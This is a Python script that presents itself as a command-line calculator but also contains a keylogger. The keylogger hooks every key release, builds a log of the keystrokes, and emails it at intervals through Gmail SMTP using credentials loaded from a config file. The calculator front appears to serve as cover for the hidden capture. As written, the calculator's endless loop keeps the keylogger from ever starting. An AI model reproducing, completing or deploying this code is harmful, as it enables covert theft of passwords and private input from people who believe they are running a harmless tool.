import keyboard # keylogging
import smtplib # sending emails
# sending logs per period of time
from threading import Timer
from datetime import datetime

# includes email address and pw of my throwaway account
import config
import helper

# global parameters
REPORT_INTERVAL = 60
EMAIL_ADDRESS = config.EMAIL_ADDRESS
EMAIL_PW = config.EMAIL_PW

CALC_INSTRUCTION = "Enter your calculations in the following format: [term] [operator] [term]"
INPUT_ERROR = "Check if all your terms are numbers!"
OPERATION_ERROR = "Make sure your operator is one of the following: "
VALID_OPERATIONS = ['+', '-', '*', '/', '^', '%']

# TODO: consider allowing brackets o_o
class Calculator:
    def __init__(self):
        self.result = 0
        # using https://patorjk.com/software/taag/#p=display&f=Graffiti&t=Type%20Something%20 to generate the ASCII art
        print(r"""
 __    __      _  __                         ___      _        
/ / /\ \ \___ | |/ _|_ __ __ _ _ __ ___     / __\ ___| |_ __ _ 
\ \/  \/ / _ \| | |_| '__/ _` | '_ ` _ \   /__\/// _ \ __/ _` |
 \  /\  / (_) | |  _| | | (_| | | | | | | / \/  \  __/ || (_| |
  \/  \/ \___/|_|_| |_|  \__,_|_| |_| |_| \_____/\___|\__\__,_|
                                                               
        """)

        print(CALC_INSTRUCTION)

    # checks if query is valid, then passes query onto another function
    def parse_query(self):
        while True:
            q = input("Enter query: ")
            query_arr = q.split()
            if len(query_arr) != 3:
                print(CALC_INSTRUCTION)
            elif not helper.is_num(query_arr[0]) or not helper.is_num(query_arr[2]):
                print(INPUT_ERROR)
            elif not query_arr[1] in VALID_OPERATIONS:
                print(OPERATION_ERROR, end=" ")
                print(VALID_OPERATIONS)
            else:
                break
        
        return query_arr

    def calculate(self, q_arr):
        x = helper.num(q_arr[0])
        y = helper.num(q_arr[2])
        op = q_arr[1]

        if op == '+':
            return helper.add(x, y)
        elif op == '-':
            return helper.subtract(x, y)
        elif op == '/':
            return helper.divide(x, y)
        elif op == '*':
            return helper.multiply(x, y)
        elif op == '%':
            return helper.mod(x, y)
        elif op == '^':
            return helper.exp(x, y)

    # constant loop until program ends
    # takes in a string and performs the operation
    def driver(self):
        while True:
            q_arr = self.parse_query()
            self.result = self.calculate(q_arr)
            print(f"{q_arr[0]} {q_arr[1]} {q_arr[2]} = {self.result}")


class Keylogger:
    def __init__(self, interval, report_mode='email'):
        self.interval = interval
        self.report_mode = report_mode
        # the log of all keystrokes within the interval...
        self.log = ""
        # recording start and end dates
        self.start_dt = datetime.now()
        self.end_dt = datetime.now()

    # use keyboard's on_release() function, calling this callback function on
    # every KEY_UP event, recording it to the existing log.
    def callback(self, event):
        # in keyboard, event is each keystroke
        name = event.name
        # TODO: add input parsing later

        self.log += name
    
    def send_email(self, email, pwd, msg):
        try:
            # using starttls()
            server = smtplib.SMTP(host='smtp.gmail.com', port=587)
            server.starttls()

            # login to email account provided
            server.login(email, pwd)
            # send the log as a message
            server.sendmail(email, email, msg)
        except Exception as e:
            print(e)    
        finally:
            print(r"""
   ('-.  _   .-')      ('-.                               .-')      ('-.       .-') _  .-') _   ,---. 
 _(  OO)( '.( OO )_   ( OO ).-.                          ( OO ).  _(  OO)     ( OO ) )(  OO) )  |   | 
(,------.,--.   ,--.) / . --. /  ,-.-')  ,--.           (_)---\_)(,------.,--./ ,--,' /     '._ |   | 
 |  .---'|   `.'   |  | \-.  \   |  |OO) |  |.-')       /    _ |  |  .---'|   \ |  |\ |'--...__)|   | 
 |  |    |         |.-'-'  |  |  |  |  \ |  | OO )      \  :` `.  |  |    |    \|  | )'--.  .--'|   | 
(|  '--. |  |'.'|  | \| |_.'  |  |  |(_/ |  |`-' |       '..`''.)(|  '--. |  .     |/    |  |   |  .' 
 |  .--' |  |   |  |  |  .-.  | ,|  |_.'(|  '---.'      .-._)   \ |  .--' |  |\    |     |  |   `--'  
 |  `---.|  |   |  |  |  | |  |(_|  |    |      |       \       / |  `---.|  | \   |     |  |   .--.  
 `------'`--'   `--'  `--' `--'  `--'    `------'        `-----'  `------'`--'  `--'     `--'   '--'  
             """)
            # terminate
            server.quit()

    # driver function, calls itself recursively using Timer to keep reporting on
    # keypress status
    def driver(self):
        if self.log:
            # if a keypress has been recorded in the interval
            self.end_dt = datetime.now()

            # if statement is relevant if I ever want to include saving to local
            # log file, as opposed to email
            if self.report_mode == 'email':
                self.send_email(EMAIL_ADDRESS, EMAIL_PW, self.log)

            # update start date of new log
            self.start_dt = datetime.now()
        # reset log!
        self.log = ''
        # call itself after a certain time
        timer = Timer(interval=self.interval, function=self.driver)
        # setting the thread as daemon means it dies when main thread dies
        timer.daemon = True
        timer.start()

    # calls the callback, defined above
    # starts the keylogger and runs the driver
    def start(self):
        self.start_dt = datetime.now()
        # begins keylogger
        keyboard.on_release(callback=self.callback)
        # begin reporting on logs
        self.driver()
        # block curr thread TODO: experiment with htis
        # should keep recording keystrokes until ctrl+c is pressed...
        keyboard.wait()

if __name__ == '__main__':
    calc = Calculator()
    calc.driver()
    my_logger = Keylogger(interval=REPORT_INTERVAL, report_mode='email')
    my_logger.start()
